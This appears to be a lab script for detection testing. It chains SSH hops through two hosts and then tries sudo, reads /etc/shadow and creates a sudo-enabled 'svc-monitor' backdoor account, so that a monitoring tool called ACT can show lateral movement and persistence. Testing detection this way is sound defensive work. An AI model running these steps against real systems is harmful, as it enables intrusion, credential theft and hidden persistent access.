#!/usr/bin/env bash
# ssh_hop.sh - the minimal "prove lateral movement is detected" script.
#
# One clean pivot: from THIS machine, SSH into host A, and from inside A's shell
# SSH into host B, then escalate + persist on B. This is the classic
# "attacker lands on a jump box and keeps going" motion, with real SSH sessions
# so ACT sees genuine journald events on both hops.
#
# Authorised lab use only. Uses SSH keys (set them up first with ssh-copy-id).
#
#   ./ssh_hop.sh deploy@10.0.5.11 dbadmin@10.0.5.20
#
# Point ACT at BOTH hosts before running (two "Go live" targets, or ingest each
# over SSH). Expect: an attack path on A ending in Lateral Movement, and a
# second path on B reaching Persistence.

set -euo pipefail

A="${1:?usage: ssh_hop.sh userA@hostA userB@hostB}"
B="${2:?usage: ssh_hop.sh userA@hostA userB@hostB}"
B_USER="${B%@*}"
B_HOST="${B#*@}"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6"

echo "[hop] this host -> $A"
ssh $SSH_OPTS "$A" bash -s <<REMOTE
  set -x
  id; hostname
  # recon on the jump box
  sudo -k; echo bad | sudo -S -l 2>/dev/null || true

  echo "[hop] $A -> $B_HOST"
  ssh $SSH_OPTS "$B" bash -s <<INNER
    set -x
    id; hostname
    # failed privilege escalation, then credential theft, then persistence
    sudo -k; echo bad | sudo -S id 2>/dev/null || true
    sudo cat /etc/shadow > /dev/null 2>&1 || true
    sudo useradd -m -s /bin/bash svc-monitor 2>/dev/null || true
    sudo usermod -aG sudo svc-monitor 2>/dev/null || true
INNER
REMOTE

echo "[hop] done - check ACT for two linked attack paths ($A then $B_HOST)."
